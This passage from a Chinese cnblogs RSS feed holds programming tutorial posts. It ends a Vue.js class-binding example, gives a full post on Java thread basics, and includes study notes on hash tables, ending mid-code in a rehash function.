&amp;lt;h2&lt;strong&gt; :class=&quot;[classaArray ,classaArray2]&quot;&lt;/strong&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
&amp;lt;h2 &lt;strong&gt;:class=&quot;getClassArray()&quot;&lt;/strong&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;完整代码:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;

&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;
    &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
    &amp;lt;script src=&quot;./js/vue.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;style&amp;gt;&lt;span&gt;
        .active {
            color: red;
        }

        .line {
            background: #666&lt;span&gt;;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;div id=&quot;app&quot;&amp;gt;
    &amp;lt;a v-bind:href=&quot;url&quot;&amp;gt;Hello&amp;lt;/a&amp;gt;
    &amp;lt;!-- 动态绑定class{对象语法} --&amp;gt;
    &amp;lt;a :href=&quot;url&quot; class=&quot;title&quot; &lt;strong&gt;:class=&quot;{active:isActive,line:isLine}&quot;&lt;/strong&gt;&amp;gt;Hello&amp;lt;/a&amp;gt;
    &amp;lt;a :href=&quot;url&quot; class=&quot;title&quot; &lt;strong&gt;:class=&quot;getClasses()&quot;&lt;/strong&gt;&amp;gt;Hello&amp;lt;/a&amp;gt;

    &amp;lt;!-- 动态绑定class[数组语法] --&amp;gt;
    &amp;lt;h2 &lt;strong&gt;:class=&quot;[classaArray ,classaArray2]&quot;&lt;/strong&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
    &amp;lt;h2 &lt;strong&gt;:class=&quot;getClassArray()&lt;/strong&gt;&quot;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
    &amp;lt;h2&amp;gt;&amp;lt;/h2&amp;gt;
    &amp;lt;button &lt;strong&gt;v-on:click=&quot;getClass&quot;&lt;/strong&gt;&amp;gt;按钮&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;body&amp;gt;
    &amp;lt;script&amp;gt;&lt;span&gt;
        let vm = new&lt;span&gt; Vue({
            el: '#app'&lt;span&gt;,
            data: () =&amp;gt;&lt;span&gt; ({
                m&lt;strong&gt;essage: &lt;/strong&gt;&lt;strong&gt;'Hello world'&lt;span&gt;,
                url: 'https://www.baidu.com/'&lt;span&gt;,
                isActive: true&lt;span&gt;,
                isLine: true&lt;span&gt;,
                classaArray: 'active'&lt;span&gt;,
                classaArray2: 'line'&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
            }),
            methods: {
                &lt;strong&gt;getClass: function () {
                    &lt;/strong&gt;&lt;strong&gt;this.isActive = !this&lt;span&gt;.isActive
                },
                getClasses: function () {
                    return { active: this.isActive, line: this&lt;span&gt;.isLine }
                },
                getClassArray: function () {
                    return [this.classaArray, this&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt;.classaArray2]
                }&lt;/strong&gt;
            }
        })
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;











&lt;p&gt;as&lt;/p&gt;
</description>
<pubDate>Fri, 19 Feb 2021 21:54:00 +0000</pubDate>
<dc:creator>盛开的太阳</dc:creator>
<og:description>目录 1. 设置vue模板 2. vue语法--插值操作 3. 动态绑定属性--v-bind 一. 设置vue模板 我们经常新建一个vue项目的时候, 会写如下的一段代码 &amp;lt;!DOCTYPE h</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/ITPower/p/14414360.html</dc:identifier>
</item>
<item>
<title>Java 线程基础 - 低吟不作语</title>
<link>http://www.cnblogs.com/Yee-Q/p/14418805.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Yee-Q/p/14418805.html</guid>
<description>&lt;br/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;本文部分摘自《Java 并发编程的艺术》&lt;/p&gt;
&lt;/blockquote&gt;&lt;br/&gt;&lt;h2 id=&quot;section&quot;&gt;线程简介&lt;/h2&gt;
&lt;h4 id=&quot;section-1&quot;&gt;1. 什么是线程？&lt;/h4&gt;
&lt;p&gt;现代操作系统在运行一个程序时，会为其创建一个进程，一个进程里可以创建多个线程。现代操作系统调度的最小单元是线程，也叫轻量级进程。这些线程都拥有各自的计数器、堆栈和局部变量等属性，并且能访问共享的内存变量。处理器在这些线程上高速切换，让使用者觉得这些线程在同时执行&lt;/p&gt;
&lt;h4 id=&quot;section-2&quot;&gt;2. 为什么使用多线程？&lt;/h4&gt;
&lt;p&gt;使用多线程的原因主要有以下几点：&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;更多的处理器核心&lt;/p&gt;
&lt;p&gt;通过使用多线程技术，将计算逻辑分配到多个处理器核心上，可以显著减少程序的处理时间&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;更快的响应时间&lt;/p&gt;
&lt;p&gt;有时我们会编写一些较为复杂的代码（主要指业务逻辑），可以使用多线程技术，将数据一致性不强的操作派发给其他线程处理（也可以使用消息队列）。这样做的好处是响应用户请求的线程能够尽可能快地处理完成，缩短了响应时间&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;更好的编程模型&lt;/p&gt;
&lt;p&gt;Java 已经为多线程编程提供了一套良好的编程模型，开发人员只需根据问题需要建立合适的模型即可&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;br/&gt;&lt;h2 id=&quot;section-3&quot;&gt;线程优先级&lt;/h2&gt;
&lt;p&gt;现代操作系统基本采用时分的形式调度运行的线程，操作系统会分出一个个时间片，线程分配到若干时间片，当线程的时间片用完了发生线程调度，并等待下次分配。线程分配到的时间片多少也就决定了线程使用处理器资源的多少，而线程优先级就是决定线程需要多或少分配一些处理器资源的线程属性&lt;/p&gt;
&lt;p&gt;在 Java 线程中，通过一个整型成员变量 priority 来控制优先级，优先级的范围从 1 ~ 10，在线程构建时可以通过 setPriority(int) 方法来修改优先级，默认优先级是 5，优先级高的线程分配时间片的数量要多于优先级低的线程。不过，在不同的 JVM 以及操作系统上，线程规划会存在差异，有些操作系统甚至会忽略线程优先级的设定&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Priority {

    private static volatile boolean notStart = true;
    private static volatile boolean notEnd = true;

    public static void main(String[] args) throws Exception {
        List&amp;lt;Job&amp;gt; jobs = new ArrayList&amp;lt;Job&amp;gt;();
        for (int i = 0; i &amp;lt; 10; i++) {
            int priority = i &amp;lt; 5 ? Thread.MIN_PRIORITY : Thread.MAX_PRIORITY;
            Job job = new Job(priority);
            jobs.add(job);
            Thread thread = new Thread(job, &quot;Thread:&quot; + i);
            thread.setPriority(priority);
            thread.start();
        }
        notStart = false;
        TimeUnit.SECONDS.sleep(10);
        notEnd = false;
        for (Job job : jobs) {
            System.out.println(&quot;Job Priority : &quot; + job.priority + &quot;, Count : &quot; + job.jobCount);
        }
    }

    static class Job implements Runnable {
        private int priority;
        private long jobCount;

        public Job(int priority) {
            this.priority = priority;
        }

        @Override
        public void run() {
            while (notStart) {
                Thread.yield();
            }
            while (notEnd) {
                Thread.yield();
                jobCount++;
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行该示例，在笔者机器上对应的输出如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202102/1759254-20210219235541386-630125590.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;笔者使用的环境为：Win10 + JDK11，从输出可以看到线程优先级起作用了&lt;/p&gt;
&lt;br/&gt;&lt;h2 id=&quot;section-4&quot;&gt;线程的状态&lt;/h2&gt;
&lt;p&gt;Java 线程在运行的生命周期中可能处于下表所示的六种不同的状态，在给定的一个时刻，线程只能处于其中的一个状态&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;状态名称&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;7&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;NEW&lt;/td&gt;
&lt;td&gt;初始状态，线程被构建，但还没调用 start() 方法&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;RUNNABLE&lt;/td&gt;
&lt;td&gt;运行状态，Java 线程将操作系统中的就绪和运行两种状态笼统地称作“运行中”&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;BLOCKED&lt;/td&gt;
&lt;td&gt;阻塞状态，表示线程阻塞于锁&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;WAITING&lt;/td&gt;
&lt;td&gt;等待状态，表示线程进入等待状态，进入该状态表示当前线程需要等待其他线程做出一些特定动作（通知或中断）&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;TIME_WAITING&lt;/td&gt;
&lt;td&gt;超时等待状态，该状态不同于 WAITING，它是可以在指定的时间自行返回的&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;TERMINATED&lt;/td&gt;
&lt;td&gt;终止状态，表示当前线程已经执行完毕&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;线程在自身的生命周期中，并不是固定地处于某一状态，而是随着代码的执行在不同的状态之间进行切换&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202102/1759254-20210219235554707-77085294.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;br/&gt;&lt;h2 id=&quot;daemon&quot;&gt;Daemon 线程&lt;/h2&gt;
&lt;p&gt;Daemon 线程是一种支持型线程，主要被用作程序中后台调度以及支持性工作。这意味着，当一个 Java 虚拟机中不存在 Daemon 线程的时候，Java 虚拟机将退出。可以调用 Thread.setDaemon(true) 将线程设置为 Daemon 线程&lt;/p&gt;
&lt;p&gt;使用 Daemon 线程需要注意两点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Daemon 属性需要在启动线程之前设置，不能在启动线程之后设置&lt;/li&gt;
&lt;li&gt;在构建 Daemon 线程时，不能依靠 finally 块中的内容来确保执行或关闭清理资源的逻辑。因为在 Java 虚拟机退出时 Daemon 线程中的 finally 块并不一定会执行&lt;/li&gt;
&lt;/ul&gt;&lt;br/&gt;&lt;h2 id=&quot;section-5&quot;&gt;启动和终止线程&lt;/h2&gt;
&lt;h4 id=&quot;section-6&quot;&gt;1. 构造线程&lt;/h4&gt;
&lt;p&gt;在运行线程之前首先要构造一个线程对象，线程对象在构造的时候需提供线程需的属性，如线程所属的线程组、是否是 Daemon 线程等信息&lt;/p&gt;
&lt;h4 id=&quot;section-7&quot;&gt;2. 启动线程&lt;/h4&gt;
&lt;p&gt;线程对象在初始化完成之后，调用 start() 方法即可启动线程&lt;/p&gt;
&lt;h4 id=&quot;section-8&quot;&gt;3. 理解中断&lt;/h4&gt;
&lt;p&gt;中断可以理解为线程的一个标识位属性，标识一个运行中的线程是否被其他线程进行了中断操作。中断好比其他线程对该线程打了个招呼，其他线程可以通过调用该线程的 interrupt() 方法对其进行中断操作&lt;/p&gt;
&lt;p&gt;线程通过检查自身是否被中断进行响应，线程通过 isInterrupted() 来进行判断是否被中断，也可以调用静态方法 Tread.interrupted() 对当前线程的中断标识位进行复位。如果线程已经处于终结状态，即时线程被中断过，在调用该对象的 isInterrupted() 时依旧会返回 false&lt;/p&gt;
&lt;p&gt;许多声明抛出 InterruptedException 的方法在抛出异常之前，Java 虚拟机会先将该线程的中断标识位清除，然后抛出 InterruptedException，此时调用 isInterrupted() 方法将会返回 false&lt;/p&gt;
&lt;p&gt;在下面的例子中，首先创建两个线程 SleepThread 和 BusyThread，前者不停地睡眠，后者一直运行，分别对两个线程分别进行中断操作，观察中断标识位&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Interrupted {

    public static void main(String[] args) throws InterruptedException {
        // sleepThread 不停的尝试睡眠
        Thread sleepThread = new Thread(new SleepRunner(), &quot;SleepThread&quot;);
        sleepThread.setDaemon(true);
        // busyThread 不停的运行
        Thread busyThread = new Thread(new BusyRunner(), &quot;BusyThread&quot;);
        busyThread.setDaemon(true);
        sleepThread.start();
        busyThread.start();
        // 休眠 5 秒，让 sleepThread 和 busyThread 充分运行
        TimeUnit.SECONDS.sleep(5);
        sleepThread.interrupt();
        busyThread.interrupt();
        System.out.println(&quot;SleepThread interrupted is &quot; + sleepThread.isInterrupted());
        System.out.println(&quot;BusyThread interrupted is &quot; + busyThread.isInterrupted());
        // 防止 sleepThread 和 busyThreaad 立刻退出
        SleepUtils.second(2);
    }

    static class SleepRunner implements Runnable {

        @Override
        public void run() {
            while (true) {
                SleepUtils.second(10);
            }
        }
    }

    static class BusyRunner implements Runnable {

        @Override
        public void run() {
            while (true) {

            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202102/1759254-20210219235616610-1723485344.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从结果可以看出，抛出 InterruptedException 的线程 SleepThread，其中断标识位被清除了，而一直忙碌运行的线程 BusyThread 的中断标识位没有被清除&lt;/p&gt;
&lt;h4 id=&quot;section-9&quot;&gt;4. 安全地终止线程&lt;/h4&gt;
&lt;p&gt;前面提到的中断操作是一种简便的线程间交互方式，适合用来取消或停止任务。除了中断以外，还可以利用一个 boolean 变量来控制是否需要停止任务并终止线程&lt;/p&gt;
&lt;p&gt;下面的示例中，创建了一个线程 CountThread，它不断地进行变量累加，而主线程尝试对其进行中断操作和停止操作&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Shutdown {

    public static void main(String[] args) throws InterruptedException {
        Runner one = new Runner();
        Thread countThread = new Thread(one, &quot;CountThread&quot;);
        countThread.start();
        // 睡眠一秒，main 线程对 CountThread 进行中断，使 CountThread 能够感知中断而结束
        TimeUnit.SECONDS.sleep(1);
        countThread.interrupt();
        Runner two = new Runner();
        countThread = new Thread(two, &quot;CountThread&quot;);
        countThread.start();
        // 睡眠一秒，main 线程对 Runner two 进行中断，使 CountThread 能够感知 on 为 false 而结束
        TimeUnit.SECONDS.sleep(1);
        two.cancel();
    }

    private static class Runner implements Runnable {

        private long i;
        private volatile boolean on = true;

        @Override
        public void run() {
            while (on &amp;amp;&amp;amp; !Thread.currentThread().isInterrupted()) {
                i++;
            }
            System.out.println(&quot;Count i = &quot; + i);
        }

        public void cancel() {
            on = false;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;main 线程通过中断操作和 cancel() 方法均可使 CountThread 得以终止。这种通过标识位或者中断操作的方式能够使线程在终止时有机会去清理资源，而不是武断地将线程停止，更加安全和优雅&lt;/p&gt;
&lt;br/&gt;</description>
<pubDate>Fri, 19 Feb 2021 15:57:00 +0000</pubDate>
<dc:creator>低吟不作语</dc:creator>
<og:description>本文部分摘自《Java 并发编程的艺术》 线程简介 1. 什么是线程？ 现代操作系统在运行一个程序时，会为其创建一个进程，一个进程里可以创建多个线程。现代操作系统调度的最小单元是线程，也叫轻量级进程。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Yee-Q/p/14418805.html</dc:identifier>
</item>
<item>
<title>《数据结构与算法分析》学习笔记-第五章-散列 - CrazyCatJack</title>
<link>http://www.cnblogs.com/CrazyCatJack/p/13340018.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CrazyCatJack/p/13340018.html</guid>
<description>&lt;hr/&gt;&lt;p&gt;散列表只支持二叉查找树所允许的一部分操作。散列是一种用于以常数平均时间执行插入、删除和查找的技术。但是，那些需要元素间任何排序信息的操作将不会得到有效的支持，例如FindMin、FindMax以及以线性时间将排过序的整个表进行打印的操作都是散列所不支持的&lt;/p&gt;
&lt;h2 id=&quot;52-散列函数&quot;&gt;5.2 散列函数&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;关键字是整数：保证表的大小为素数。直接返回Key mod TableSize&lt;/li&gt;
&lt;li&gt;关键字是字符串：根据horner法则，计算一个（32的）多项式函数。&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;Index
Hash(const char *Key, int TableSize)
{
    unsigned int HashVal = 0;
    while (*Key != '\0')
        //HashVal = (HashVal &amp;lt;&amp;lt; 5) + *Key++;
        HashVal = (HashVal &amp;lt;&amp;lt; 5) ^ *Key++;
    
    return HashVal % TableSize;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果关键字特别长，那么散列函数计算起来会花过多的时间，而且前面的字符还会左移出最终的结果。因此这样情况下，不使用所有的字符。此时关键字的长度和性质会影响选择。例如只取奇数位置上的字符来实现散列函数。这里的思想是用计算散列函数省下来的时间来补偿由此产生的对均匀分布函数的轻微干扰&lt;br/&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;当一个元素插入的位置已经存在另一个元素的时候（散列值相同），就叫做冲突。下面介绍&lt;mark&gt;解决冲突&lt;/mark&gt;的两种方法：分离链接法和开放定址法。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;53-分离链接法（separate-chaining）&quot;&gt;5.3 分离链接法（separate chaining）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;将散列到同一个值的所有元素保留到一个表中。比如链表。为方便起见，这些表都有表头；如果空间很紧的话，则可以不用表头。&lt;/li&gt;
&lt;li&gt;执行Find：首先根据散列函数判断该遍历哪个表，然后遍历链表返回元素位置&lt;/li&gt;
&lt;li&gt;执行Insert: 首先根据散列函数判断该插入哪个表，然后插入元素到链表中。如果要插入重复元，那么通常要留出一个额外的域，这个域当重复元出现时增1.通常将元素插入到表的前端，因为新元素最有可能被最先访问&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;531-实现&quot;&gt;5.3.1 实现&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;节点定义: 这里使用了typedef，避免双重指针的混乱&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;#define MINTABLESIZE 11
struct HashTbl;
typedef struct HashTbl *HashTable;

typedef Stack List;
struct HashTbl
{
    int TableSize;
    List *TheLists;
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;InitializeTable&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HashTable
InitializeTable(int TableSize)
{
    if (TableSize &amp;lt; MINTABLESIZE) {
        printf(&quot;TableSize too small\n&quot;);
        return NULL;
    }
    
    HashTable H = NULL;
    H = (HashTable)malloc(sizeof(struct HashTbl));
    if (H == NULL) {
        printf(&quot;HashTable malloc failed\n&quot;);
        return NULL;
    }
    memset(H, 0, sizeof(struct HashTbl));
    
    H-&amp;gt;TableSize = GetNextPrime(TableSize);
    H-&amp;gt;TheLists = (List *)malloc(sizeof(List) * H-&amp;gt;TableSize);
    if (H-&amp;gt;TheLists == NULL) {
        printf(&quot;HashTable TheLists malloc failed\n&quot;);
        free(H);
        H = NULL;
        return NULL;
    }
    memset(H-&amp;gt;TheLists, 0, sizeof(List) * H-&amp;gt;TableSize);
    
    int cnt, cnt2;
    for (cnt = 0; cnt &amp;lt; H-&amp;gt;TableSize; cnt++) {
        H-&amp;gt;TheLists[cnt] = CreateStack();
        if (H-&amp;gt;TheLists[cnt] == NULL) {
            printf(&quot;H-&amp;gt;TheLists[%d]malloc failed\n&quot;, cnt);
            for (cnt2 = 0; cnt2 &amp;lt; cnt; cnt2++) {
                if (H-&amp;gt;TheLists[cnt2] != NULL) {
                    DistroyStack(H-&amp;gt;TheLists[cnt2]);
                    H-&amp;gt;TheLists[cnt2] = NULL;
                }
            }
            if (H-&amp;gt;TheLists != NULL) {
                free(H-&amp;gt;TheLists);
                H-&amp;gt;TheLists = NULL;
            }
            if (H != NULL) {
                free(H);
                H = NULL;
            }
            return NULL;
        }
    }
    
    return H;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;PtrToNode
Find(ElementType Key, HashTable H)
{
    if (H == NULL) {
        printf(&quot;ERROR: H is NULL\n&quot;);
        return NULL;
    }
    
    PtrToNode tmp = NULL;
        tmp = H-&amp;gt;TheLists[GetHashSubmit(Key, H-&amp;gt;TableSize)]-&amp;gt;Next;
        while (tmp != NULL &amp;amp;&amp;amp; tmp-&amp;gt;Element != Key) {
                tmp = tmp-&amp;gt;Next;
        }
    return tmp;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;void
Insert(ElementType Key, HashTable H)
{
        if (H == NULL) {
                printf(&quot;HashTable is NULL\n&quot;);
                return;
        }
        
        if (0 != Push(Key, H-&amp;gt;TheLists[GetHashSubmit(Key, H-&amp;gt;TableSize)])) {
                printf(&quot;Insert Key failed\n&quot;);
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;散列表的&lt;mark&gt;装填因子&lt;/mark&gt;为散列表的&lt;mark&gt;元素个数与散列表大小的比值&lt;/mark&gt;。&lt;/li&gt;
&lt;li&gt;执行一次查找所需时间是计算散列函数值所需要的常数事件加上遍历表（list）所用的事件。不成功的查找，也就是遍历整个链表长度。成功的查找则需要遍历大约1+链表长度/2.&lt;/li&gt;
&lt;li&gt;装填因子是最重要的。一般法则是使得表的大小尽量与预料的元素个数差不多，也就是让装填因子约等于1.&lt;/li&gt;
&lt;li&gt;同时，使表的大小是一个素数以保证一个好的分布，这也是一个好的想法&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;54-开放定址法open-addressing-hashing&quot;&gt;5.4 开放定址法(Open addressing hashing)&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;由于分离链接法插入时需要申请内存空间，因此算法速度有些减慢&lt;/li&gt;
&lt;li&gt;如有冲突发生，那么就要尝试选择另外的单元，直到&lt;mark&gt;找出空的单元&lt;/mark&gt;为止。更一般的，单元h0(x), h1(x), h2(x)，相继被试选，其中hi(x) = (Hash(x) + F(i)) mod TableSize, 且F(0) = 0。函数F是冲突解决方法&lt;/li&gt;
&lt;li&gt;因为所有的数据都要置于表内，所以开放定址散列法所需要的表比分离链接散列表大。一般说来，对&lt;mark&gt;开放定址散列算法来说，装填因子应该低于0.5&lt;/mark&gt;。&lt;/li&gt;
&lt;li&gt;下面来考察三个通常的冲突解决方法&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;541-线性探测法&quot;&gt;5.4.1 线性探测法&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;典型情形：F(i) = i。只要想插入的单元已经有元素，就继续遍历到下一个单元，直到找到空的单元插入为止（解决冲突）。这样花费的时间很多，而且即使表相对较空。这样占据的单元会开始形成一些区块，其结果成为一次聚集。于是，散列到区块中的任何关键字都需要多次试选单元才能解决冲突，然后该关键字被添加到相应的区块中&lt;/li&gt;
&lt;li&gt;插入 &amp;amp; 不成功的查找的预期探测次数大约都为1/2 （1 + 1/（1 - 装填因子）^2）；&lt;/li&gt;
&lt;li&gt;对于成功的查找来说，则是1/2（1 + 1/（1 - 装填因子））。可以看出成功查找应该比不成功查找平均花费较少的时间&lt;/li&gt;
&lt;li&gt;空单元所占份额为1 - 装填因子。因此预计要探测的单元数为1 / （1 - 装填因子）&lt;/li&gt;
&lt;li&gt;一个元素被插入时，可以看成是一次不成功查找的结果，因此可以使用一次不成查找的开销来计算一次成功查找的平均开销&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;542-平方探测法&quot;&gt;5.4.2 平方探测法&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;平方探测就是冲突函数为二次函数的探测方法。典型是F(i) = i&lt;sup&gt;2。产生冲突时，先寻找当前单元的下2&lt;/sup&gt;0 = 1个单元，如果还是冲突，则寻找当前单元的下2^2 = 4个单元，直到找到空单元为止。&lt;/li&gt;
&lt;li&gt;对于线性探测，让元素几乎填满列表并不是个好主意，因为表的性能会下降的厉害。而对于平方探测法，一旦表被填满超过一半，当&lt;mark&gt;表的大小不是素数时甚至在表被填满一半之前&lt;/mark&gt;，就不能保证一次找到一个空单元了。这是因为最多有表的一半可以用作解决冲突的被选位置&lt;/li&gt;
&lt;li&gt;定理5.1：如果使用平方探测，且表的大小是素数，那么当表至少有一半是空的时候，总能够插入一个新的元素。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;证明：
令表的大小TableSize是一个大于3的素数。我们证明，前[TableSize / 2]个备选位置是互异的。
h(X) + i^2(mod TableSize)和h(X) + j^2(mod TableSize)是这些位置中的两个，其中0 &amp;lt; i, j &amp;lt;= [TableSize / 2]。为推出矛盾，假设这两个位置相同，但i != j，于是

1) h(X) + i^2 = h(X) + j^2 (mod TableSize)
2) i^2 - j^2 = 0
3) (i + j)(i - j) = 0

所以i = -j或者i = j，因为i != j，且i,j都大于0,所以前[TableSize / 2]个备选位置是互异的
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;由于要被插入的元素，若无任何冲突发生，也可以放到经散列得到的单元，因此任何元素都有[TableSize / 2]个可能被放到的位置，如果最多有[TableSie / 2]个位置可以使用，那么空单元总能够找到&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;哪怕表有比一半多一个的位置被填满，那么插入都有可能失败&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;表的大小是素数也非常重要，如果表的大小不是素数，则备选单元的个数也可能锐减&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;在开放定址散列表中，标准的删除操作&lt;mark&gt;不能实行&lt;/mark&gt;。因为相应的单元可能已经引起过冲突，元素绕过了它存在了别处。因此，开放定址散列表需要懒惰删除。&lt;/li&gt;
&lt;li&gt;虽然平方探测排除了一次聚集，但是散列到同一位置上的那些元素将探测相同的备选单元，这叫做二次聚集。对于每次查找，它一般要引起另外的少于一半的探测，因此可以使用双散列，通过一些额外的乘法和除法解决这个问题&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;543-双散列&quot;&gt;5.4.3 双散列&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;F(i) = i * hash2(X)。将第二个散列函数应用到X并在距离hash2(X)，2hash2(X)等处探测。hash2(X)&lt;mark&gt;选择的不好将会是灾难性的&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;保证所有的单元都能被探测到&lt;/li&gt;
&lt;li&gt;hash2(X) = R - (X mod R)这样的函数将起到良好的作用；&lt;mark&gt;R为小于TableSize的素数&lt;/mark&gt;。举例：hash2(49) = 7 - 0 = 7，如果位置9产生冲突，则9 + 7 - 10 = 6，看位置6是否产生冲突，如果仍然冲突，则 6 + 7 - 10 = 3，如果位置3没有冲突则插入位置3.&lt;/li&gt;
&lt;li&gt;如果散列表的大小不是素数，那么备选单元就有可能提前用完。如果双散列正确实现，则预期的探测次数几乎和随机冲突解决方法的情形相同，这使得双散列理论上很有吸引力，不过平方探测不需要使用第二个散列函数，从而在时间上可能更简单并且更快&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;55-再散列&quot;&gt;5.5 再散列&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;对于使用平方探测的开放定址散列法，如果表的元素填的太慢，那么操作时间将会消耗过长，且Insert操作可能失败。一种解决办法是建立另外一个&lt;mark&gt;大约两倍大&lt;/mark&gt;的表，而且使用一个相关的新散列函数。扫描整个原始散列表，计算每个未删除的元素的新散列值并将其插入到新表中&lt;/li&gt;
&lt;li&gt;如果再散列是程序的一部分，那么其效果是不显著的，但是如果它作为交互系统的一部分运行，那么其插入引起的再散列的用户就会感到速度缓慢&lt;/li&gt;
&lt;li&gt;实现方法：
&lt;ol&gt;&lt;li&gt;只要表填满一半就再散列&lt;/li&gt;
&lt;li&gt;只有插入失败时才再散列&lt;/li&gt;
&lt;li&gt;当表达到某一个装填因子时就再散列&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;再散列把程序员从表的大小的担心中解放出来，再散列还能用在其他数据结构中，例如队列变满时，可以声明一个双倍大小的数组，并将每一个成员拷贝过来同时释放原来的队列&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HashTable
ReHash(HashTable H)
{
        if (H == NULL) {
                printf(&quot;H is NULL!\n&quot;);
                return NULL;
